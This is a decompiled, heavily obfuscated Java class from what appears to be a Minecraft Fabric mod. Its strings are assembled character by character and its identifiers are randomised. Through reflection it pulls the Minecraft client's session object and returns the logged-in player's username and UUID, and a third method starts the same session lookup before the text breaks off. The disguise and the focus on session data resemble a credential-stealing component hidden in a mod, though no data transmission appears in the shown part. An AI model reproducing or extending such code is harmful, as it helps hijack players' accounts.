/*
 * Decompiled with CFR 0.152.
 */
package net.fabric;

import java.lang.reflect.AccessibleObject;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;

public final class emnnr_sxvzsk {
    private emnnr_sxvzsk() {
        emnnr_sxvzsk bscqIqgdEdLhiiwi;
    }

    /*
     * Could not resolve type clashes
     * WARNING - void declaration
     */
    public static String uPqgkgye() {
        try {
            String[] stringArray = new String[3];
            StringBuilder stringBuilder = new StringBuilder();
            StringBuilder stringBuilder2 = new StringBuilder();
            stringBuilder2.append('n');
            stringBuilder2.append('e');
            stringBuilder2.append('t');
            stringBuilder2.append('.');
            stringBuilder2.append('m');
            stringBuilder2.append('i');
            stringBuilder2.append('n');
            stringBuilder2.append('e');
            stringBuilder2.append('c');
            stringBuilder2.append('r');
            stringBuilder2.append('a');
            stringBuilder2.append('f');
            stringBuilder.append(stringBuilder2.toString());
            StringBuilder stringBuilder3 = new StringBuilder();
            stringBuilder3.append('t');
            stringBuilder3.append('.');
            stringBuilder3.append('c');
            stringBuilder3.append('l');
            stringBuilder3.append('a');
            stringBuilder3.append('s');
            stringBuilder3.append('s');
            stringBuilder3.append('_');
            stringBuilder3.append('3');
            stringBuilder3.append('1');
            stringBuilder3.append('0');
            stringBuilder.append(stringBuilder3.toString());
            stringArray[0] = stringBuilder.toString();
            StringBuilder stringBuilder4 = new StringBuilder();
            StringBuilder stringBuilder5 = new StringBuilder();
            stringBuilder5.append('n');
            stringBuilder5.append('e');
            stringBuilder5.append('t');
            stringBuilder5.append('.');
            stringBuilder5.append('m');
            stringBuilder5.append('i');
            stringBuilder5.append('n');
            stringBuilder5.append('e');
            stringBuilder5.append('c');
            stringBuilder5.append('r');
            stringBuilder5.append('a');
            stringBuilder4.append(stringBuilder5.toString());
            char[] cArray = new char[]{'f', 't', '.', 'c', 'l', 'i', 'e', 'n', 't'};  // 'ft.client'
            stringBuilder4.append("ft.client");
            char[] cArray2 = new char[]{'.', 'M', 'i', 'n', 'e', 'c', 'r', 'a', 'f', 't'};  // '.Minecraft'
            stringBuilder4.append(".Minecraft");
            stringArray[1] = stringBuilder4.toString();
            StringBuilder stringBuilder6 = new StringBuilder();
            char[] cArray3 = new char[]{'n', 'e', 't', '.', 'm', 'i', 'n'};  // 'net.min'
            stringBuilder6.append("net.min");
            StringBuilder stringBuilder7 = new StringBuilder();
            stringBuilder7.append('e');
            stringBuilder7.append('c');
            stringBuilder7.append('r');
            stringBuilder7.append('a');
            stringBuilder7.append('f');
            stringBuilder7.append('t');
            stringBuilder7.append('.');
            stringBuilder7.append('c');
            stringBuilder7.append('l');
            stringBuilder7.append('i');
            stringBuilder7.append('e');
            stringBuilder7.append('n');
            stringBuilder7.append('t');
            stringBuilder7.append('.');
            stringBuilder6.append(stringBuilder7.toString());
            StringBuilder stringBuilder8 = new StringBuilder();
            stringBuilder8.append('M');
            stringBuilder8.append('i');
            stringBuilder8.append('n');
            stringBuilder8.append('e');
            stringBuilder8.append('c');
            stringBuilder8.append('r');
            stringBuilder8.append('a');
            stringBuilder8.append('f');
            stringBuilder8.append('t');
            stringBuilder8.append('C');
            stringBuilder8.append('l');
            stringBuilder8.append('i');
            stringBuilder8.append('e');
            stringBuilder8.append('n');
            stringBuilder8.append('t');
            stringBuilder6.append(stringBuilder8.toString());
            stringArray[2] = stringBuilder6.toString();
            for (String ZB7O_g_s_1_1b : stringArray) {
                void elVoglm;
                try {
                    Class<?> valuedata = Class.forName(ZB7O_g_s_1_1b);
                }
                catch (ClassNotFoundException BbKGXU) {
                    continue;
                }
                Object refItem = null;
                for (Method dozvKyuicXhoiks : elVoglm.getDeclaredMethods()) {
                    if (!Modifier.isStatic(dozvKyuicXhoiks.getModifiers()) || dozvKyuicXhoiks.getParameterCount() != 0) continue;
                    String string = dozvKyuicXhoiks.getName();
                    StringBuilder stringBuilder9 = new StringBuilder();
                    stringBuilder9.append('g');
                    stringBuilder9.append('e');
                    stringBuilder9.append('t');
                    stringBuilder9.append('I');
                    stringBuilder9.append('n');
                    stringBuilder9.append('s');
                    stringBuilder9.append('t');
                    stringBuilder9.append('a');
                    stringBuilder9.append('n');
                    stringBuilder9.append('c');
                    stringBuilder9.append('e');
                    if (!string.equals(stringBuilder9.toString())) {
                        char[] cArray4 = new char[]{'m', 'e', 't', 'h', 'o', 'd', '_', '1', '5', '5', '1'};  // 'method_1551'
                        if (!dozvKyuicXhoiks.getName().equals("method_1551") && dozvKyuicXhoiks.getReturnType() != elVoglm) continue;
                    }
                    dozvKyuicXhoiks.setAccessible(true);
                    refItem = dozvKyuicXhoiks.invoke(null, new Object[0]);
                    if (refItem != null) break;
                }
                if (refItem == null) {
                    for (AccessibleObject r5h____iH : elVoglm.getDeclaredFields()) {
                        if (!Modifier.isStatic(((Field)r5h____iH).getModifiers()) || ((Field)r5h____iH).getType() != elVoglm) continue;
                        char[] cArray5 = new char[]{'i', 'n', 's', 't', 'a', 'n', 'c', 'e'};  // 'instance'
                        if (!((Field)r5h____iH).getName().equals("instance")) {
                            String string = ((Field)r5h____iH).getName();
                            StringBuilder stringBuilder10 = new StringBuilder();
                            stringBuilder10.append('f');
                            stringBuilder10.append('i');
                            stringBuilder10.append('e');
                            stringBuilder10.append('l');
                            stringBuilder10.append('d');
                            stringBuilder10.append('_');
                            stringBuilder10.append('1');
                            stringBuilder10.append('7');
                            stringBuilder10.append('0');
                            stringBuilder10.append('0');
                            if (!string.equals(stringBuilder10.toString())) continue;
                        }
                        ((Field)r5h____iH).setAccessible(true);
                        refItem = ((Field)r5h____iH).get(null);
                        if (refItem != null) break;
                    }
                }
                if (refItem == null) continue;
                Object yuca_hwlfdn_dicqu_yhejt = null;
                for (Method aieqss_wk : refItem.getClass().getMethods()) {
                    if (aieqss_wk.getParameterCount() != 0 || Modifier.isStatic(aieqss_wk.getModifiers())) continue;
                    String string = aieqss_wk.getName();
                    StringBuilder stringBuilder11 = new StringBuilder();
                    stringBuilder11.append('g');
                    stringBuilder11.append('e');
                    stringBuilder11.append('t');
                    stringBuilder11.append('S');
                    stringBuilder11.append('e');
                    stringBuilder11.append('s');
                    stringBuilder11.append('s');
                    stringBuilder11.append('i');
                    stringBuilder11.append('o');
                    stringBuilder11.append('n');
                    if (!string.equals(stringBuilder11.toString())) {
                        String string2 = aieqss_wk.getName();
                        StringBuilder stringBuilder12 = new StringBuilder();
                        stringBuilder12.append('g');
                        stringBuilder12.append('e');
                        stringBuilder12.append('t');
                        stringBuilder12.append('U');
                        stringBuilder12.append('s');
                        stringBuilder12.append('e');
                        stringBuilder12.append('r');
                        if (!string2.equals(stringBuilder12.toString())) {
                            String string3 = aieqss_wk.getName();
                            StringBuilder stringBuilder13 = new StringBuilder();
                            stringBuilder13.append('m');
                            stringBuilder13.append('e');
                            stringBuilder13.append('t');
                            stringBuilder13.append('h');
                            stringBuilder13.append('o');
                            stringBuilder13.append('d');
                            stringBuilder13.append('_');
                            stringBuilder13.append('1');
                            stringBuilder13.append('5');
                            stringBuilder13.append('4');
                            stringBuilder13.append('8');
                            if (!string3.equals(stringBuilder13.toString())) {
                                char[] cArray6;
                                StringBuilder stringBuilder14 = new StringBuilder();
                                stringBuilder14.append('S');
                                stringBuilder14.append('e');
                                stringBuilder14.append('s');
                                stringBuilder14.append('s');
                                stringBuilder14.append('i');
                                stringBuilder14.append('o');
                                stringBuilder14.append('n');
                                if (!stringBuilder14.toString().equals(aieqss_wk.getReturnType().getSimpleName()) && !new String(cArray6 = new char[]{'U', 's', 'e', 'r'}).equals(aieqss_wk.getReturnType().getSimpleName())) continue;
                            }
                        }
                    }
                    aieqss_wk.setAccessible(true);
                    yuca_hwlfdn_dicqu_yhejt = aieqss_wk.invoke(refItem, new Object[0]);
                    if (yuca_hwlfdn_dicqu_yhejt != null) break;
                }
                if (yuca_hwlfdn_dicqu_yhejt == null) {
                    for (AccessibleObject W84FlgulCw2_5z : refItem.getClass().getDeclaredFields()) {
                        if (Modifier.isStatic(((Field)W84FlgulCw2_5z).getModifiers())) continue;
                        String string = ((Field)W84FlgulCw2_5z).getName();
                        StringBuilder stringBuilder15 = new StringBuilder();
                        stringBuilder15.append('s');
                        stringBuilder15.append('e');
                        stringBuilder15.append('s');
                        stringBuilder15.append('s');
                        stringBuilder15.append('i');
                        stringBuilder15.append('o');
                        stringBuilder15.append('n');
                        if (!string.equals(stringBuilder15.toString())) {
                            char[] cArray7 = new char[]{'u', 's', 'e', 'r'};  // 'user'
                            if (!((Field)W84FlgulCw2_5z).getName().equals("user")) {
                                char[] cArray8 = new char[]{'f', 'i', 'e', 'l', 'd', '_', '1', '7', '2', '6'};  // 'field_1726'
                                if (!((Field)W84FlgulCw2_5z).getName().equals("field_1726")) continue;
                            }
                        }
                        ((Field)W84FlgulCw2_5z).setAccessible(true);
                        yuca_hwlfdn_dicqu_yhejt = ((Field)W84FlgulCw2_5z).get(refItem);
                        if (yuca_hwlfdn_dicqu_yhejt != null) break;
                    }
                }
                if (yuca_hwlfdn_dicqu_yhejt == null) continue;
                for (AccessibleObject mcHn_phgb_BYkD_yzPr : yuca_hwlfdn_dicqu_yhejt.getClass().getMethods()) {
                    if (((Method)mcHn_phgb_BYkD_yzPr).getParameterCount() != 0 || Modifier.isStatic(((Method)mcHn_phgb_BYkD_yzPr).getModifiers())) continue;
                    char[] cArray9 = new char[]{'g', 'e', 't', 'U', 's', 'e', 'r', 'n', 'a', 'm', 'e'};  // 'getUsername'
                    if (!((Method)mcHn_phgb_BYkD_yzPr).getName().equals("getUsername")) {
                        String string = ((Method)mcHn_phgb_BYkD_yzPr).getName();
                        StringBuilder stringBuilder16 = new StringBuilder();
                        stringBuilder16.append('g');
                        stringBuilder16.append('e');
                        stringBuilder16.append('t');
                        stringBuilder16.append('N');
                        stringBuilder16.append('a');
                        stringBuilder16.append('m');
                        stringBuilder16.append('e');
                        if (!string.equals(stringBuilder16.toString())) {
                            char[] cArray10 = new char[]{'m', 'e', 't', 'h', 'o', 'd', '_', '1', '6', '7', '6'};  // 'method_1676'
                            if (!((Method)mcHn_phgb_BYkD_yzPr).getName().equals("method_1676")) continue;
                        }
                    }
                    ((Method)mcHn_phgb_BYkD_yzPr).setAccessible(true);
                    Object hpyobMewkDxFg = ((Method)mcHn_phgb_BYkD_yzPr).invoke(yuca_hwlfdn_dicqu_yhejt, new Object[0]);
                    if (hpyobMewkDxFg == null) continue;
                    return hpyobMewkDxFg.toString();
                }
                for (AccessibleObject RIYZ : yuca_hwlfdn_dicqu_yhejt.getClass().getDeclaredFields()) {
                    if (Modifier.isStatic(((Field)RIYZ).getModifiers())) continue;
                    char[] cArray11 = new char[]{'u', 's', 'e', 'r', 'n', 'a', 'm', 'e'};  // 'username'
                    if (!((Field)RIYZ).getName().equals("username")) {
                        String string = ((Field)RIYZ).getName();
                        StringBuilder stringBuilder17 = new StringBuilder();
                        stringBuilder17.append('n');
                        stringBuilder17.append('a');
                        stringBuilder17.append('m');
                        stringBuilder17.append('e');
                        if (!string.equals(stringBuilder17.toString())) {
                            char[] cArray12 = new char[]{'f', 'i', 'e', 'l', 'd', '_', '1', '9', '8', '2'};  // 'field_1982'
                            if (!((Field)RIYZ).getName().equals("field_1982")) continue;
                        }
                    }
                    ((Field)RIYZ).setAccessible(true);
                    Object QBOC_nnHS_kexi_NCWI = ((Field)RIYZ).get(yuca_hwlfdn_dicqu_yhejt);
                    if (QBOC_nnHS_kexi_NCWI == null) continue;
                    return QBOC_nnHS_kexi_NCWI.toString();
                }
            }
        }
        catch (ReflectiveOperationException | RuntimeException exception) {
            // empty catch block
        }
        return null;
    }

    /*
     * Could not resolve type clashes
     * WARNING - void declaration
     */
    public static String YHzZxNbRmRZw() {
        try {
            String[] stringArray = new String[3];
            StringBuilder stringBuilder = new StringBuilder();
            StringBuilder stringBuilder2 = new StringBuilder();
            stringBuilder2.append('n');
            stringBuilder2.append('e');
            stringBuilder2.append('t');
            stringBuilder2.append('.');
            stringBuilder2.append('m');
            stringBuilder2.append('i');
            stringBuilder2.append('n');
            stringBuilder2.append('e');
            stringBuilder2.append('c');
            stringBuilder2.append('r');
            stringBuilder2.append('a');
            stringBuilder2.append('f');
            stringBuilder2.append('t');
            stringBuilder2.append('.');
            stringBuilder2.append('c');
            stringBuilder.append(stringBuilder2.toString());
            char[] cArray = new char[]{'l', 'a', 's', 's', '_', '3', '1', '0'};  // 'lass_310'
            stringBuilder.append("lass_310");
            stringArray[0] = stringBuilder.toString();
            StringBuilder stringBuilder3 = new StringBuilder();
            char[] cArray2 = new char[]{'n', 'e', 't', '.', 'm', 'i', 'n', 'e', 'c', 'r', 'a', 'f', 't', '.', 'c'};  // 'net.minecraft.c'
            stringBuilder3.append("net.minecraft.c");
            char[] cArray3 = new char[]{'l', 'i', 'e', 'n', 't', '.', 'M', 'i', 'n', 'e', 'c', 'r', 'a', 'f', 't'};  // 'lient.Minecraft'
            stringBuilder3.append("lient.Minecraft");
            stringArray[1] = stringBuilder3.toString();
            StringBuilder stringBuilder4 = new StringBuilder();
            char[] cArray4 = new char[]{'n', 'e', 't', '.', 'm', 'i', 'n', 'e', 'c', 'r', 'a', 'f', 't', '.'};  // 'net.minecraft.'
            stringBuilder4.append("net.minecraft.");
            char[] cArray5 = new char[]{'c', 'l', 'i', 'e', 'n', 't', '.', 'M', 'i', 'n', 'e', 'c', 'r', 'a'};  // 'client.Minecra'
            stringBuilder4.append("client.Minecra");
            char[] cArray6 = new char[]{'f', 't', 'C', 'l', 'i', 'e', 'n', 't'};  // 'ftClient'
            stringBuilder4.append("ftClient");
            stringArray[2] = stringBuilder4.toString();
            for (String temp2 : stringArray) {
                void fuy_urpo;
                try {
                    Class<?> vzOeFhlg = Class.forName(temp2);
                }
                catch (ClassNotFoundException keKyj) {
                    continue;
                }
                Object idxLen = null;
                for (Method vLen : fuy_urpo.getDeclaredMethods()) {
                    if (!Modifier.isStatic(vLen.getModifiers()) || vLen.getParameterCount() != 0) continue;
                    char[] cArray7 = new char[]{'g', 'e', 't', 'I', 'n', 's', 't', 'a', 'n', 'c', 'e'};  // 'getInstance'
                    if (!vLen.getName().equals("getInstance")) {
                        String string = vLen.getName();
                        StringBuilder stringBuilder5 = new StringBuilder();
                        stringBuilder5.append('m');
                        stringBuilder5.append('e');
                        stringBuilder5.append('t');
                        stringBuilder5.append('h');
                        stringBuilder5.append('o');
                        stringBuilder5.append('d');
                        stringBuilder5.append('_');
                        stringBuilder5.append('1');
                        stringBuilder5.append('5');
                        stringBuilder5.append('5');
                        stringBuilder5.append('1');
                        if (!string.equals(stringBuilder5.toString()) && vLen.getReturnType() != fuy_urpo) continue;
                    }
                    vLen.setAccessible(true);
                    idxLen = vLen.invoke(null, new Object[0]);
                    if (idxLen != null) break;
                }
                if (idxLen == null) {
                    for (AccessibleObject key1 : fuy_urpo.getDeclaredFields()) {
                        if (!Modifier.isStatic(((Field)key1).getModifiers())) continue;
                        int n = -434494570;
                        if (n - -434494570 == 0) {
                            long l = 1830456923L;
                            l *= 101L;
                            l ^= 0x18618F98L;
                        }
                        if (((Field)key1).getType() != fuy_urpo) continue;
                        String string = ((Field)key1).getName();
                        StringBuilder stringBuilder6 = new StringBuilder();
                        stringBuilder6.append('i');
                        stringBuilder6.append('n');
                        stringBuilder6.append('s');
                        stringBuilder6.append('t');
                        stringBuilder6.append('a');
                        stringBuilder6.append('n');
                        stringBuilder6.append('c');
                        stringBuilder6.append('e');
                        if (!string.equals(stringBuilder6.toString())) {
                            String string2 = ((Field)key1).getName();
                            StringBuilder stringBuilder7 = new StringBuilder();
                            stringBuilder7.append('f');
                            stringBuilder7.append('i');
                            stringBuilder7.append('e');
                            stringBuilder7.append('l');
                            stringBuilder7.append('d');
                            stringBuilder7.append('_');
                            stringBuilder7.append('1');
                            stringBuilder7.append('7');
                            stringBuilder7.append('0');
                            stringBuilder7.append('0');
                            if (!string2.equals(stringBuilder7.toString())) continue;
                        }
                        ((Field)key1).setAccessible(true);
                        idxLen = ((Field)key1).get(null);
                        if (idxLen != null) break;
                    }
                }
                if (idxLen == null) continue;
                Object xOAh_Ogkz_DRPs_LKOt = null;
                for (Method G8U3zBC : idxLen.getClass().getMethods()) {
                    if (G8U3zBC.getParameterCount() != 0 || Modifier.isStatic(G8U3zBC.getModifiers())) continue;
                    char[] cArray8 = new char[]{'g', 'e', 't', 'S', 'e', 's', 's', 'i', 'o', 'n'};  // 'getSession'
                    if (!G8U3zBC.getName().equals("getSession")) {
                        char[] cArray9 = new char[]{'g', 'e', 't', 'U', 's', 'e', 'r'};  // 'getUser'
                        if (!G8U3zBC.getName().equals("getUser")) {
                            String string = G8U3zBC.getName();
                            StringBuilder stringBuilder8 = new StringBuilder();
                            stringBuilder8.append('m');
                            stringBuilder8.append('e');
                            stringBuilder8.append('t');
                            stringBuilder8.append('h');
                            stringBuilder8.append('o');
                            stringBuilder8.append('d');
                            stringBuilder8.append('_');
                            stringBuilder8.append('1');
                            stringBuilder8.append('5');
                            stringBuilder8.append('4');
                            stringBuilder8.append('8');
                            if (!string.equals(stringBuilder8.toString())) {
                                StringBuilder stringBuilder9 = new StringBuilder();
                                stringBuilder9.append('S');
                                stringBuilder9.append('e');
                                stringBuilder9.append('s');
                                stringBuilder9.append('s');
                                stringBuilder9.append('i');
                                stringBuilder9.append('o');
                                stringBuilder9.append('n');
                                if (!stringBuilder9.toString().equals(G8U3zBC.getReturnType().getSimpleName())) {
                                    StringBuilder stringBuilder10 = new StringBuilder();
                                    stringBuilder10.append('U');
                                    stringBuilder10.append('s');
                                    stringBuilder10.append('e');
                                    stringBuilder10.append('r');
                                    if (!stringBuilder10.toString().equals(G8U3zBC.getReturnType().getSimpleName())) continue;
                                }
                            }
                        }
                    }
                    G8U3zBC.setAccessible(true);
                    xOAh_Ogkz_DRPs_LKOt = G8U3zBC.invoke(idxLen, new Object[0]);
                    if (xOAh_Ogkz_DRPs_LKOt != null) break;
                }
                if (xOAh_Ogkz_DRPs_LKOt == null) {
                    for (AccessibleObject zMax : idxLen.getClass().getDeclaredFields()) {
                        if (Modifier.isStatic(((Field)zMax).getModifiers())) continue;
                        char[] cArray10 = new char[]{'s', 'e', 's', 's', 'i', 'o', 'n'};  // 'session'
                        if (!((Field)zMax).getName().equals("session")) {
                            char[] cArray11 = new char[]{'u', 's', 'e', 'r'};  // 'user'
                            if (!((Field)zMax).getName().equals("user")) {
                                char[] cArray12 = new char[]{'f', 'i', 'e', 'l', 'd', '_', '1', '7', '2', '6'};  // 'field_1726'
                                if (!((Field)zMax).getName().equals("field_1726")) continue;
                            }
                        }
                        ((Field)zMax).setAccessible(true);
                        xOAh_Ogkz_DRPs_LKOt = ((Field)zMax).get(idxLen);
                        if (xOAh_Ogkz_DRPs_LKOt != null) break;
                    }
                }
                if (xOAh_Ogkz_DRPs_LKOt == null) continue;
                for (AccessibleObject rmpqlm_decpo_myrrz : xOAh_Ogkz_DRPs_LKOt.getClass().getMethods()) {
                    if (((Method)rmpqlm_decpo_myrrz).getParameterCount() != 0 || Modifier.isStatic(((Method)rmpqlm_decpo_myrrz).getModifiers())) continue;
                    char[] cArray13 = new char[]{'g', 'e', 't', 'U', 'u', 'i', 'd', 'O', 'r', 'N', 'u', 'l', 'l'};  // 'getUuidOrNull'
                    if (!((Method)rmpqlm_decpo_myrrz).getName().equals("getUuidOrNull")) {
                        String string = ((Method)rmpqlm_decpo_myrrz).getName();
                        StringBuilder stringBuilder11 = new StringBuilder();
                        stringBuilder11.append('g');
                        stringBuilder11.append('e');
                        stringBuilder11.append('t');
                        stringBuilder11.append('P');
                        stringBuilder11.append('r');
                        stringBuilder11.append('o');
                        stringBuilder11.append('f');
                        stringBuilder11.append('i');
                        stringBuilder11.append('l');
                        stringBuilder11.append('e');
                        stringBuilder11.append('I');
                        stringBuilder11.append('d');
                        if (!string.equals(stringBuilder11.toString())) {
                            String string3 = ((Method)rmpqlm_decpo_myrrz).getName();
                            StringBuilder stringBuilder12 = new StringBuilder();
                            stringBuilder12.append('g');
                            stringBuilder12.append('e');
                            stringBuilder12.append('t');
                            stringBuilder12.append('U');
                            stringBuilder12.append('u');
                            stringBuilder12.append('i');
                            stringBuilder12.append('d');
                            if (!string3.equals(stringBuilder12.toString())) {
                                String string4 = ((Method)rmpqlm_decpo_myrrz).getName();
                                StringBuilder stringBuilder13 = new StringBuilder();
                                stringBuilder13.append('m');
                                stringBuilder13.append('e');
                                stringBuilder13.append('t');
                                stringBuilder13.append('h');
                                stringBuilder13.append('o');
                                stringBuilder13.append('d');
                                stringBuilder13.append('_');
                                stringBuilder13.append('4');
                                stringBuilder13.append('4');
                                stringBuilder13.append('7');
                                stringBuilder13.append('1');
                                stringBuilder13.append('7');
                                if (!string4.equals(stringBuilder13.toString())) continue;
                            }
                        }
                    }
                    ((Method)rmpqlm_decpo_myrrz).setAccessible(true);
                    Object ujwhmDyeVmZmrm = ((Method)rmpqlm_decpo_myrrz).invoke(xOAh_Ogkz_DRPs_LKOt, new Object[0]);
                    if (ujwhmDyeVmZmrm == null) continue;
                    return ujwhmDyeVmZmrm.toString();
                }
                for (AccessibleObject RzPH_QEpt_ZMDf_kAwI : xOAh_Ogkz_DRPs_LKOt.getClass().getDeclaredFields()) {
                    if (Modifier.isStatic(((Field)RzPH_QEpt_ZMDf_kAwI).getModifiers())) continue;
                    String string = ((Field)RzPH_QEpt_ZMDf_kAwI).getName();
                    StringBuilder stringBuilder14 = new StringBuilder();
                    stringBuilder14.append('u');
                    stringBuilder14.append('u');
                    stringBuilder14.append('i');
                    stringBuilder14.append('d');
                    if (!string.equals(stringBuilder14.toString())) {
                        char[] cArray14 = new char[]{'f', 'i', 'e', 'l', 'd', '_', '1', '9', '8', '5'};  // 'field_1985'
                        if (!((Field)RzPH_QEpt_ZMDf_kAwI).getName().equals("field_1985")) continue;
                    }
                    ((Field)RzPH_QEpt_ZMDf_kAwI).setAccessible(true);
                    Object Dpst_ThM_vg = ((Field)RzPH_QEpt_ZMDf_kAwI).get(xOAh_Ogkz_DRPs_LKOt);
                    if (Dpst_ThM_vg == null) continue;
                    return Dpst_ThM_vg.toString();
                }
            }
        }
        catch (ReflectiveOperationException | RuntimeException exception) {
            // empty catch block
        }
        return null;
    }

    /*
     * Could not resolve type clashes
     * WARNING - void declaration
     */
    public static String gcvyOfjHlndqgLnqhi() {
        try {
            String[] stringArray = new String[3];
            StringBuilder stringBuilder = new StringBuilder();
            char[] cArray = new char[]{'n', 'e', 't', '.', 'm', 'i', 'n'};  // 'net.min'
            stringBuilder.append("net.min");
            char[] cArray2 = new char[]{'e', 'c', 'r', 'a', 'f', 't', '.', 'c', 'l', 'a', 's', 's', '_', '3', '1', '0'};  // 'ecraft.class_310'
            stringBuilder.append("ecraft.class_310");
            stringArray[0] = stringBuilder.toString();
            StringBuilder stringBuilder2 = new StringBuilder();
            StringBuilder stringBuilder3 = new StringBuilder();
            stringBuilder3.append('n');
            stringBuilder3.append('e');
            stringBuilder3.append('t');
            stringBuilder3.append('.');
            stringBuilder3.append('m');
            stringBuilder3.append('i');
            stringBuilder3.append('n');
            stringBuilder3.append('e');
            stringBuilder3.append('c');
            stringBuilder2.append(stringBuilder3.toString());
            char[] cArray3 = new char[]{'r', 'a', 'f', 't', '.', 'c', 'l', 'i'};  // 'raft.cli'
            stringBuilder2.append("raft.cli");
            char[] cArray4 = new char[]{'e', 'n', 't', '.', 'M', 'i', 'n', 'e', 'c', 'r', 'a', 'f', 't'};  // 'ent.Minecraft'
            stringBuilder2.append("ent.Minecraft");
            stringArray[1] = stringBuilder2.toString();
            StringBuilder stringBuilder4 = new StringBuilder();
            char[] cArray5 = new char[]{'n', 'e', 't', '.', 'm', 'i', 'n', 'e', 'c', 'r', 'a', 'f', 't', '.', 'c'};  // 'net.minecraft.c'
            stringBuilder4.append("net.minecraft.c");
            StringBuilder stringBuilder5 = new StringBuilder();
            stringBuilder5.append('l');
            stringBuilder5.append('i');
            stringBuilder5.append('e');
            stringBuilder5.append('n');
            stringBuilder5.append('t');
            stringBuilder5.append('.');
            stringBuilder5.append('M');
            stringBuilder5.append('i');
            stringBuilder5.append('n');
            stringBuilder5.append('e');
            stringBuilder5.append('c');
            stringBuilder5.append('r');
            stringBuilder5.append('a');
            stringBuilder4.append(stringBuilder5.toString());
            StringBuilder stringBuilder6 = new StringBuilder();
            stringBuilder6.append('f');
            stringBuilder6.append('t');
            stringBuilder6.append('C');
            stringBuilder6.append('l');
            stringBuilder6.append('i');
            stringBuilder6.append('e');
            stringBuilder6.append('n');
            stringBuilder6.append('t');
            stringBuilder4.append(stringBuilder6.toString());
            stringArray[2] = stringBuilder4.toString();
            for (String paramOut : stringArray) {
                void lik_pkjo_ciuiyn;
                try {
                    Class<?> nameLen = Class.forName(paramOut);
                }
                catch (ClassNotFoundException valueCnt) {
                    continue;
                }
                Object tmpData = null;
                for (Method uxagBsjtKqtpVker : lik_pkjo_ciuiyn.getDeclaredMethods()) {
                    if (!Modifier.isStatic(uxagBsjtKqtpVker.getModifiers()) || uxagBsjtKqtpVker.getParameterCount() != 0) continue;
                    char[] cArray6 = new char[]{'g', 'e', 't', 'I', 'n', 's', 't', 'a', 'n', 'c', 'e'};  // 'getInstance'
                    if (!uxagBsjtKqtpVker.getName().equals("getInstance")) {
                        char[] cArray7 = new char[]{'m', 'e', 't', 'h', 'o', 'd', '_', '1', '5', '5', '1'};  // 'method_1551'
                        if (!uxagBsjtKqtpVker.getName().equals("method_1551") && uxagBsjtKqtpVker.getReturnType() != lik_pkjo_ciuiyn) continue;
                    }
                    uxagBsjtKqtpVker.setAccessible(true);
                    tmpData = uxagBsjtKqtpVker.invoke(null, new Object[0]);
                    if (tmpData != null) break;
                }
                if (tmpData == null) {
                    for (AccessibleObject aYCHzK : lik_pkjo_ciuiyn.getDeclaredFields()) {
                        if (!Modifier.isStatic(((Field)aYCHzK).getModifiers()) || ((Field)aYCHzK).getType() != lik_pkjo_ciuiyn) continue;
                        String string = ((Field)aYCHzK).getName();
                        StringBuilder stringBuilder7 = new StringBuilder();
                        stringBuilder7.append('i');
                        stringBuilder7.append('n');
                        stringBuilder7.append('s');
                        stringBuilder7.append('t');
                        stringBuilder7.append('a');
                        stringBuilder7.append('n');
                        stringBuilder7.append('c');
                        stringBuilder7.append('e');
                        if (!string.equals(stringBuilder7.toString())) {
                            String string2 = ((Field)aYCHzK).getName();
                            StringBuilder stringBuilder8 = new StringBuilder();
                            stringBuilder8.append('f');
                            stringBuilder8.append('i');
                            stringBuilder8.append('e');
                            stringBuilder8.append('l');
                            stringBuilder8.append('d');
                            stringBuilder8.append('_');
                            stringBuilder8.append('1');
                            stringBuilder8.append('7');
                            stringBuilder8.append('0');
                            stringBuilder8.append('0');
                            if (!string2.equals(stringBuilder8.toString())) continue;
                        }
                        ((Field)aYCHzK).setAccessible(true);
                        tmpData = ((Field)aYCHzK).get(null);
                        if (tmpData != null) break;
                    }
                }
                if (tmpData == null) continue;
                Object capSum = null;
                for (Method ubn_ztjs_fvpp : tmpData.getClass().getMethods()) {
                    if (ubn_ztjs_fvpp.getParameterCount() != 0 || Modifier.isStatic(ubn_ztjs_fvpp.getModifiers())) continue;
                    char[] cArray8 = new char[]{'g', 'e', 't', 'S', 'e', 's', 's', 'i', 'o', 'n'};  // 'getSession'
                    if (!ubn_ztjs_fvpp.getName().equals("getSession")) {
                        char[] cArray9 = new char[]{'g', 'e', 't', 'U', 's', 'e', 'r'};  // 'getUser'
                        if (!ubn_ztjs_fvpp.getName().equals("getUser")) {
                            String string = ubn_ztjs_fvpp.getName();
                            StringBuilder stringBuilder9 = new StringBuilder();
                            stringBuilder9.append('m');
                            stringBuilder9.append('e');
                            stringBuilder9.append('t');
                            stringBuilder9.append('h');
                            stringBuilder9.append('o');
                            stringBuilder9.append('d');
                            stringBuilder9.append('_');
                            stringBuilder9.append('1');
                            stringBuilder9.append('5');
                            stringBuilder9.append('4');
                            stringBuilder9.append('8');
                            if (!string.equals(stringBuilder9.toString())) {
                                char[] cArray10;
                                StringBuilder stringBuilder10 = new StringBuilder();
                                stringBuilder10.append('S');
                                stringBuilder10.append('e');
                                stringBuilder10.append('s');
                                stringBuilder10.append('s');
                                stringBuilder10.append('i');
                                stringBuilder10.append('o');
                                stringBuilder10.append('n');
                                if (!stringBuilder10.toString().equals(ubn_ztjs_fvpp.getReturnType().getSimpleName()) && !new String(cArray10 = new char[]{'U', 's', 'e', 'r'}).equals(ubn_ztjs_fvpp.getReturnType().getSimpleName())) continue;
                            }
                        }
                    }
                    ubn_ztjs_fvpp.setAccessible(true);
                    capSum = ubn_ztjs_fvpp.invoke(tmpData, new Object[0]);
                    if (capSum != null) break;
                }
                if (capSum == null) {
                    for (AccessibleObject itemAvg : tmpData.getClass().getDeclaredFields()) {
                        if (Modifier.isStatic(((Field)itemAvg).getModifiers())) continue;
                        String string = ((Field)itemAvg).getName();
                        StringBuilder stringBuilder11 = new StringBuilder();
                        stringBuilder11.append('s');
                        stringBuilder11.append('e');
                        stringBuilder11.append('s');
                        stringBuilder11.append('s');
                        stringBuilder11.append('i');
                        stringBuilder11.append('o');
                        stringBuilder11.append('n');
                        if (!string.equals(stringBuilder11.toString())) {
                            String string3 = ((Field)itemAvg).getName();
                            StringBuilder stringBuilder12 = new StringBuilder();
                            stringBuilder12.append('u');
                            stringBuilder12.append('s');
                            stringBuilder12.append('e');
                            stringBuilder12.append('r');
                            if (!string3.equals(stringBuilder12.toString())) {
                                String string4 = ((Field)itemAvg).getName();
                                StringBuilder stringBuilder13 = new StringBuilder();
                                stringBuilder13.append('f');
                                stringBuilder13.append('i');
                                stringBuilder13.append('e');
                                stringBuilder13.append('l');
                                stringBuilder13.append('d');
